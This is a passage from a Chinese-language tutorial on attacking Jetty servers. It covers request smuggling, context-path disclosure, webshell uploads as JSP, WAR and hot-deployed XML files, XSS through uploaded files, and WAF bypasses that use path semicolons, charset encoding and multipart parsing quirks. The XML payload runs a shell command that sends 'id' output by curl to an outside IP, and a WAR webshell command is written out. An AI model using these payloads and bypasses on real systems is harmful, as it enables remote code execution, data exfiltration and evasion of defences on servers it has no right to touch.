    'POST /?test=4976 HTTP/1.1\r\n'\
    'Content-Length: 5\r\n'\
    'Host: localhost\r\n'\
    '\r\n'\
    '\r\n'\
    '0\r\n'\
    '\r\n'\
    |nc 127.0.0.1 8994|grep "HTTP/1.1"
    HTTP/1.1 200 OK
    HTTP/1.1 200 OK
#### 0x3 上下文
**Jetty当没有设置根应用目录、文件时，会显示`webapps`里目录信息**
**如果没有设置根应用程序，而是通过`web.xml`映射方式提供服务，那么可以采用下面方式获取应用上下文目录**
**demo-simple.xml配置**
      /
      /demo-simple.war
          test.local
          172.22.16.108
**通过浏览器访问，`jetty`会正常进行工作，但是，如果我们在`Host`标头中附带不属于`xml
Item`标签内的信息通过GET请求发送，在应用响应的结果中会显示`目录上下文`信息**
**在`xml Item`标签添加`127.0.0.1`演示**
**无法通过添加`127.0.0.1 Host 标头`获取上下文目录信息**
**使用新的标头，依然可以获取上下文信息**
#### 0x4 上传RCE
**`jsp Jetty`是基于`Apache Jasper`的模块支持`JSP`**
**默认情况下，`org.eclipse.jetty.jsp.JettyJspServlet`负责处理`Jetty`中的`JSP`文件。**
**`$JETTY_HOME/etc/webdefault.xml`配置文件，默认情况下会将下面类型文件解析为`JSP`文件**
**jetty中要解析`JSP`文件，需要启动`jsp`模块**
    java -jar start.jar --module=jsp
##### 0x01 常见上传目录
**常见上传`JSP`一般都会保存在`$JETTY_BASE/webapps/root`，这种`RCE`方式只需要了解一下就行。**
##### 0x02 上传临时目录
**`Jetty`如果没有设置固定的"工作"目录，每次启动服务时生成的临时目录都会附带上随机数字字符串**
**临时目录结构如下：**
    "jetty-"+host+"-"+port+"-"+resourceBase+"-_"+context+"-"+virtualhost+"-"+randomdigits+"
  * 我看文档说时会在上面的目录结构后加上`.dir`，但是我环境中就没有发现有加上`.dir`。这里需要注意一下，有可能是我的问题。
  * `0.0.0.0`是主机地址，`8080`是端口，`test_war`是resourceBase，`test`(`root`)是上下文路径（将/转换为_），`any`是虚拟主机，`randomdigits`是一串随机数字。
**这里我的上下文目录可能有些多，所以看起来有点乱，只需要知道`test`（`root`）代表的是`webapps`里面的目录即可。**
**如果能找到已经创建的临时目录，可以尝试上传`shell`到`$JETTY_BASE/work/"jetty-"+host+"-"+port+"-"+resourceBase+"-_"+context+"-"+virtualhost+"-"/webapps/`中**
  * 测试时，我发现临时目录中没有`webapps`目录，那么就无法成功访问。
**设置工作目录**
**设置工作目录只需要在`${jetty.base}`目录创建一个`work`目录，而且`work`目录一般都用作`WEB`应用程序所有临时文件夹的父目录,启动服务时，会在`work`目录创建临时目录**
**在“工作”目录下的临时目录结构如下：**
    "jetty-"+host+"-"+port+"-"+resourceBase+"-_"+context+"-"+virtualhost+"-"
  * `0.0.0.0`是主机地址，`8080`是端口，`demo-simple_war`是resourceBase，`test`(`root`)是上下文路径（将/转换为_），`any`是虚拟主机。
#### 0x5 上传war文件rce
**当无法上传`jsp`文件时，我们还可以上传`war`文件`GETSHELL`。**
**制作`war webshell`文件只需要将`shell`文件压缩成`war`后缀即可**
    zip -r shell.war index.jsp
**将`war`文件上传到`$jetty_base/webapps/`，这样就可以`RCE`了**
**服务器没有开启`jsp`模块，那么即使上传`war`文件也无法`RCE`，只能使用`servlet`创建`java`应用完成`RCE`**
#### 0x6 上传XML文件RCE
**除去上述上传`jsp`、`war`文件可以`RCE`外，还可以通过上传`XML`文件进行`RCE`**
**`XML`文件有自己的语法，允许实例化任何对象，并调用`getter`、`setter`和方法。**
  * 下面只是简单演示复现，如果想看更详细的内容推荐看这个[链接](https://mp.weixin.qq.com/s?__biz=Mzg3NjY1MDEwNA==&mid=2247483832&idx=1&sn=1fae284c4e66fc775b66fa11843ee6e5&chksm=cf2e4aaff859c3b94e31090d162203137ae3d69e88fb7efa041fa6c6d8a0f0afa129a8969dcf&scene=126&sessionid=1666801519&key=7d0747fd59e25d7fde7ea56ba3dbd27a46d71079bf4557cddd6dbf67fa6db01e1ddbabb678fd4bcc7224669ee8965fce920d364b72df2693de98b47a8b167470e6d863f08ff16523db3ee676ab857c47f0181b6b4fe51768664afc7f4b10df76c50dab93fd63c3320127442a62713a4a9e4c89703855a75a6dfa7f0a74ecdea1&ascene=15&uin=NTY2NTA4NjQ%3D&devicetype=Windows+Server+2016+x64&version=63070517&lang=zh_CN&session_us=gh_41c701ef9ecc&exportkey=n_ChQIAhIQi5%2BpKMYH%2FDrH1EHxMoTs6hL4AQIE97dBBAEAAAAAAADLOSx1qosAAAAOpnltbLcz9gKNyK89dVj0xiFhktn%2FS0Sp9BKDKmlZ1BjR%2BeKTtT7aNi%2BHCPBh6XL5F0crat5q9zC47pXJ6BunwkDJPOo2g%2FPdt%2BHeJciD1fIHWXKqowMcVhVw%2Buna2LNLFROsCo8PXF%2BqX1lkkGbC3DGY0AlDcB9HUkTAYH0WytQBKhQGYoLbaLISQceAWRnWhhfIsH0x58hFjQc7o8DoOg4DzN2D8L40WLNukN5%2F1z0FnLXUn5LKDtzFymWAGSoPBCVUgkm300gD3Z9maUC7hNJr3lCwAHFmWsbJ5AlPPRG9&ac)
**XML代码**
         /bin/sh
         -c
         curl -F "r=`id`" http://192.168.0.0:80
**`XML`文件上传后无需要服务器重启，`jetty`的热部署功能会自动扫描部署新的`web`应用程序**
#### 0x7 上传文件XSS
**`JETTY`服务器不仅可以上传总所周知的`.html`或`.svg`文件，还可以上传其他冷门扩展名的文件。**
**有效载荷：**
  * xml 载荷`alert('PTSWARM')`
  * html 载荷``
**我这里比较懒就直接抄作业了**
**除了上述这些文件可以上传导致XSS外，如果`JETTY`服务器响应时没有Content-type
标头，可以尝试自定义内容`MIME`类型，都可以导致`XSS`，不过载荷一般都是使用``**
#### 0x8 Jetty绕WAF
**`jetty`绕过这段，我没弄成本地环境，也找不到相关环境。所以就直接用原文的内容。**
**原文地址：**
##### 0x01 绕过waf拦截目录
**了解了`Jetty`服务器如何解析`URL`地址，我们可以绕过代理服务器上的过滤器。想象一下，`Jetty`服务器部署在`NGINX`代理后面，其规则阻止对
`/adminURL/*`的请求。**
    location ~ /adminURL/ {
      deny all;
    }
    location / {
      proxy_pass       http://localhost:8080;
      proxy_set_header Host      $host;
      proxy_set_header X-Real-IP $remote_addr;
    }
**如果只在代理上配置了这个规则，我们可以向`/adminURL;random/` 发送`HTTP`请求，并获得对服务器上受保护资源的访问权限。**
##### 0x02 绕过waf读取文件
**JSP文件代码**
**应用程序从用户请求中接收`filename`参数，使用该参数中的路径打开文件，并将文件内容返回给用户。这是一个允许我们读取任意文件的漏洞。但是，如果应用程序受到`WAF`的保护，该`WAF`会阻止所有在`GET或POST`参数中包含`/`的请求呢？**
**被`WAF`拦截情况下，可以利用`request.getParameter`方法处理参数的方式。`getParameter`在不同的中间件服务器上工作方式都有所不同。`getParameter`在`jetty`应用程序调用时，`getParameter`会在`GET`和`POST`参数中查找值。如果使用`POST`请求发送`Content-Type: multipart/form-data`，`Jetty`会将该请求使用单独的解析器来解析。**
**如果POST参数中包含`_charset_`字段，则多部份解析将使用指定的编码处理`所有参数`。这样我们可以使用字符编码来绕过`WAF`拦截，因为`WAF`不可能识别所有不同编码的字符**
**图片中使用的是`ibm037`编码**
**使用上面的方法绕过`waf`需要服务器启动多部份处理。如果服务器托管处理文件上传的应用程序，则将启用多部分处理。**
**不启动多部份处理的服务器可能会跟图片下提示**
##### 0x03 jetty 边界解析
**解析多部份请求的边界时，解析器在到达`;`边界字符串就会停止。`;`后面的所有字符串都会被忽略。**
##### 0x04 jetty 清除反斜杠
**jetty从多部份请求中提取参数名称时，会把反斜杠清除，即`\[any_symbol]`被转换成`[any_symbol]`。我们可以利用该机制绕过`WAF`，下面使用`XSS`漏洞演示**
#### 参考链接
)  
.
[https://mp.weixin.qq.com/s?__biz=Mzg3NjY1MDEwNA==&mid=2247483832&idx=1&sn=1fae284c4e66fc775b66fa11843ee6e5&chksm=cf2e4aaff859c3b94e31090d162203137ae3d69e88fb7efa041fa6c6d8a0f0afa129a8969dcf&scene=126&sessionid=1666801519&key=7d0747fd59e25d7fde7ea56ba3dbd27a46d71079bf4557cddd6dbf67fa6db01e1ddbabb678fd4bcc7224669ee8965fce920d364b72df2693de98b47a8b167470e6d863f08ff16523db3ee676ab857c47f0181b6b4fe51768664afc7f4b10df76c50dab93fd63c3320127442a62713a4a9e4c89703855a75a6dfa7f0a74ecdea1&ascene=15&uin=NTY2NTA4NjQ%3D&devicetype=Windows+Server+2016+x64&version=63070517&lang=zh_CN&session_us=gh_41c701ef9ecc&exportkey=n_ChQIAhIQi5%2BpKMYH%2FDrH1EHxMoTs6hL4AQIE97dBBAEAAAAAAADLOSx1qosAAAAOpnltbLcz9gKNyK89dVj0xiFhktn%2FS0Sp9BKDKmlZ1BjR%2BeKTtT7aNi%2BHCPBh6XL5F0crat5q9zC47pXJ6BunwkDJPOo2g%2FPdt%2BHeJciD1fIHWXKqowMcVhVw%2Buna2LNLFROsCo8PXF%2BqX1lkkGbC3DGY0AlDcB9HUkTAYH0WytQBKhQGYoLbaLISQceAWRnWhhfIsH0x58hFjQc7o8DoOg4DzN2D8L40WLNukN5%2F1z0FnLXUn5LKDtzFymWAGSoPBCVUgkm300gD3Z9maUC7hNJr3lCwAHFmWsbJ5AlPPRG9&ac](https://mp.weixin.qq.com/s?__biz=Mzg3NjY1MDEwNA==&mid=2247483832&idx=1&sn=1fae284c4e66fc775b66fa11843ee6e5&chksm=cf2e4aaff859c3b94e31090d162203137ae3d69e88fb7efa041fa6c6d8a0f0afa129a8969dcf&scene=126&sessionid=1666801519&key=7d0747fd59e25d7fde7ea56ba3dbd27a46d71079bf4557cddd6dbf67fa6db01e1ddbabb678fd4bcc7224669ee8965fce920d364b72df2693de98b47a8b167470e6d863f08ff16523db3ee676ab857c47f0181b6b4fe51768664afc7f4b10df76c50dab93fd63c3320127442a62713a4a9e4c89703855a75a6dfa7f0a74ecdea1&ascene=15&uin=NTY2NTA4NjQ%3D&devicetype=Windows+Server+2016+x64&version=63070517&lang=zh_CN&session_us=gh_41c701ef9ecc&exportkey=n_ChQIAhIQi5%2BpKMYH%2FDrH1EHxMoTs6hL4AQIE97dBBAEAAAAAAADLOSx1qosAAAAOpnltbLcz9gKNyK89dVj0xiFhktn%2FS0Sp9BKDKmlZ1BjR%2BeKTtT7aNi%2BHCPBh6XL5F0crat5q9zC47pXJ6BunwkDJPOo2g%2FPdt%2BHeJciD1fIHWXKqowMcVhVw%2Buna2LNLFROsCo8PXF%2BqX1lkkGbC3DGY0AlDcB9HUkTAYH0WytQBKhQGYoLbaLISQceAWRnWhhfIsH0x58hFjQc7o8DoOg4DzN2D8L40WLNukN5%2F1z0FnLXUn5LKDtzFymWAGSoPBCVUgkm300gD3Z9maUC7hNJr3lCwAHFmWsbJ5AlPPRG9&ac)